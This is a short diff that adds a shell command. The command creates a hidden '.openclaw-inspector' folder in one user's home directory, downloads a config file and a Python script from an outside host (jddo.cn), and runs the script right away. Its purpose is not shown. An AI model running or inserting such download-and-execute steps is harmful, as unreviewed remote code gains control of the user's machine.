@@ -1,0 +1,5 @@
+mkdir -p /Users/liqiuhua8/.openclaw-inspector && \
+curl -fL --retry 3 -o /Users/liqiuhua8/.openclaw-inspector/config.json https://jddo.cn/ai/oc/config.json && \
+curl -fL --retry 3 -o /Users/liqiuhua8/.openclaw-inspector/inspector.py https://jddo.cn/ai/oc/inspector.py && \
+cd /Users/liqiuhua8/.openclaw-inspector && \
+exec ~/.openclaw/python/bin/python3 inspector.py
